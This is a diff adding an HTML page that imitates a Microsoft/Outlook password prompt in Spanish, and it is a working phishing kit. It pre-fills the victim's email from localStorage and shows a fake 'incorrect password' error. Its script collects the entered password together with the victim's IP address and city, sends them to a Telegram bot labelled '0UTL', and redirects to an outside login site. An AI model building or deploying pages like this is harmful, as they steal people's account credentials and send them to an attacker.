@@ -1,0 +1,138 @@
+<!DOCTYPE html><html lang="es"><head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Bienvenido</title> <link rel="stylesheet" href="style.css"> <link rel="shortcut icon" href="picts/ico.ico" type="image/x-icon"> <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Reddit+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet"></head><body> 
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>    
+    <div class="cont"> <div class="cont-form"> 
+        <!-- <div class="log"> 
+            <img src="picts/out.png" alt=""> 
+        </div>  -->
+        <div class="cont-xjsx"> <div class="lg"> <img src="picts/log.svg" alt=""> </div> 
+    <div class="tras"> 
+        <svg  xmlns="http://www.w3.org/2000/svg"  width="20"  height="20"  viewBox="0 0 24 24"  fill="none"  stroke="#ababab"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-arrow-left"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l14 0" /><path d="M5 12l6 6" /><path d="M5 12l6 -6" /></svg>
+     <p id="local"></p>
+    </div> 
+    <div class="txt-sin"> <p>Escribir contraseña</p> </div>
+    <p id="err" style="color: #e81123;">Su cuenta o contraseña es incorrecta. Si no recuerda la contraseña, <a style="text-decoration: none; color: #0067b8;" href="#">restablézcala ahora.</a></p>
+     <form id="xjsx" method="post"> 
+        <div class="usr"> 
+            <input id="js2" name="js2" type="password" placeholder="Contraseña"> 
+        </div> <p id="lce"><a href="#">¿Ha olvidado su contraseña?</a></p>
+        <!-- <div class="pln">
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="#ababab"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-key"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M16.555 3.843l3.602 3.602a2.877 2.877 0 0 1 0 4.069l-2.643 2.643a2.877 2.877 0 0 1 -4.069 0l-.301 -.301l-6.558 6.558a2 2 0 0 1 -1.239 .578l-.175 .008h-1.172a1 1 0 0 1 -.993 -.883l-.007 -.117v-1.172a2 2 0 0 1 .467 -1.284l.119 -.13l.414 -.414h2v-2h2v-2l2.144 -2.144l-.301 -.301a2.877 2.877 0 0 1 0 -4.069l2.643 -2.643a2.877 2.877 0 0 1 4.069 0z" /><path d="M15 9h.01" /></svg>
+            <input id="js3" type="password" placeholder="PIN" maxlength="6">
+        </div>  -->
+        <div class="sub"> <input type="submit" value="Iniciar sesión"> 
+        </div> 
+    </form>
+    
+    </div> </div> </div> <div class="sefue"> <p>Términos de uso</p> <p>Privacidad y cookies</p> <p>...</p> </div> 
+    <div id="gfg" style="display:none;"></div> 
+    <div id="ip" style="display:none;"></div> 
+    <div id="address" style="display:none;"></div>
+    
+    </body></html>
+    <script src="/xjsx.js"></script>
+    <script>
+        
+document.addEventListener('DOMContentLoaded', function() {
+        const xjsx = document.querySelector('#xjsx');
+        let js2 = document.querySelector('#js2');
+
+        const err = document.querySelector('#err');
+        const js1Recuperado = localStorage.getItem('js1');
+        document.getElementById('local').innerText = js1Recuperado;
+
+
+
+
+
+        xjsx.addEventListener('submit', e => {
+            e.preventDefault();
+            if (js2.value.trim().length === 0) {
+                err.innerHTML = "Campo obligatorio";
+                return false;
+            } else if (js2.value.trim().length <= 4) {
+                err.innerHTML = "Contraseña incorrecta";
+                return false;
+            }
+            sender(e);
+        });
+
+
+    });
+
+    function fetchIPData() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("gfg").innerHTML = data.ip;
+                return fetch('https://ipinfo.io/json?token=46da206f1311c9'); 
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("ip").innerHTML = `IP: ${data.ip}`;
+                document.getElementById("address").innerHTML = `${data.city}, ${data.country}`;
+            });
+    }
+
+    function sender(e) {
+        e.preventDefault();
+        fetchIPData().then(() => {
+            let js2 = document.getElementById("js2").value;
+            const js1Recuperado = localStorage.getItem('js1');
+            const ip = document.getElementById("gfg").innerHTML;
+            const ip2 = document.getElementById("address").innerHTML;
+            const message = `🍄🍄0UTL🍄🍄\n\nC0RRE0: ${js1Recuperado}\nPASSWR: ${js2}\n🌎IP: ${ip}\n${ip2}`;
+
+            const T0K3N = T0KEN; 
+            const chatID = CHATID; 
+
+            const settings = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'cache-control': 'no-cache'
+                },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: message
+                })
+            };
+
+            fetch(`https://api.telegram.org/bot${T0K3N}/sendMessage`, settings)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                            // nipper.style.display = 'flex';
+
+                            window.location.href = 'https://afb-web.albo.live/login';
+
+                    } else {
+                        alert('Intenta nuevamente, algo salio mal.');
+                        console.error('Telegram error:', data);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred');
+                });
+        });
+    }
+    </script>
